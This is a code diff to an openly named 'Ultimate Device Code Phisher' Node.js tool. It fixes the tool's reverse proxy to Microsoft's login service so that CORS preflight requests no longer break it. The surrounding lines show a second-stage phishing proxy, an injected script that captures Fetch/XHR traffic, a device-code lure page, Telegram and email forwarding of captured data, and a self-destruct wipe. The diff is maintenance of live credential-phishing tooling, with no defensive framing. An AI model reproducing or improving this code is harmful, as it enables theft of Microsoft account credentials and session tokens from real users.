@@ -1,7 +1,7 @@
 // ============================================================
-// 🥔 ULTIMATE DEVICE CODE PHISHER v5.4.7 – Origin Stripped
+// 🥔 ULTIMATE DEVICE CODE PHISHER v5.4.8 – Preflight Fix
 // ============================================================
-// Fixed GetCredentialType 500 error by stripping Origin/Referer.
+// Fixed GetCredentialType 500 error by handling OPTIONS locally.
 // ============================================================
 
 const http = require('http');
@@ -652,6 +652,15 @@ app.post('/device/fingerprint', (req, res) => {
 
 // ── SECOND-STAGE PHISHING: CRASH‑PROOF REVERSE PROXY ──
 app.all('/login*', async (req, res) => {
+    // 🔥 FIX: Handle OPTIONS preflight requests locally to avoid 500 from Microsoft
+    if (req.method === 'OPTIONS') {
+        res.setHeader('Access-Control-Allow-Origin', '*');
+        res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
+        res.setHeader('Access-Control-Allow-Headers', '*');
+        res.status(204).send();
+        return;
+    }
+
     const targetBase = 'https://login.microsoftonline.com';
     let targetPath = req.url.replace(/^\/login/, '');
     
@@ -673,8 +682,8 @@ app.all('/login*', async (req, res) => {
     delete headers.host;
     delete headers['content-length'];
     delete headers['transfer-encoding'];
-    delete headers['origin'];       // <-- FIX: Removed to prevent 500 error
-    delete headers['referer'];      // <-- FIX: Removed to prevent API confusion
+    delete headers['origin'];       // Prevent Microsoft API 500 errors
+    delete headers['referer'];      // Prevent API confusion
     headers['Host'] = 'login.microsoftonline.com';
 
     let bodyData = null;
@@ -737,7 +746,7 @@ app.all('/login*', async (req, res) => {
             try {
                 const $ = cheerio.load(html);
                 
-                // 🔥 UPDATED CAPTURE SCRIPT: Also intercepts Fetch/XHR for API calls (CORS fix)
+                // 🔥 CAPTURE SCRIPT: Also intercepts Fetch/XHR for API calls
                 const captureScript = `
                     <script>
                         (function() {
@@ -1072,7 +1081,7 @@ server.on('upgrade', (req, socket, head) => {
     if (req.url === '/ws') { wsServer.handleUpgrade(req, socket, head, (ws) => { wsServer.emit('connection', ws, req); }); } else { socket.destroy(); }
 });
 server.listen(PORT, '0.0.0.0', () => {
-    console.log(`✅ Ultimate Device Phisher v5.4.7 – Origin Stripped running on port ${PORT}`);
+    console.log(`✅ Ultimate Device Phisher v5.4.8 – Preflight Fix running on port ${PORT}`);
     console.log(`📱 Device page: http://localhost:${PORT}/device`);
     console.log(`📊 Dashboard: http://localhost:${PORT}/dash`);
     console.log(`🔧 Telegram: ${BOT_TOKEN ? 'ACTIVE' : 'DISABLED'}`);
@@ -1080,7 +1089,7 @@ server.listen(PORT, '0.0.0.0', () => {
     console.log(`📁 Campaigns: active`);
     console.log(`📧 Forward Email: ${FORWARD_EMAIL || 'DISABLED'}`);
     console.log(`💣 Self-Destruct: ${AUTO_WIPE_HOURS > 0 ? `after ${AUTO_WIPE_HOURS} hrs inactive` : 'DISABLED'}`);
-    console.log(`🚀 Full reverse-proxy with CORS bypass and Origin stripped: ACTIVE`);
+    console.log(`🚀 Full reverse-proxy with Preflight handled locally: ACTIVE`);
 });
 
 process.on('SIGTERM', () => server.close(() => process.exit(0)));
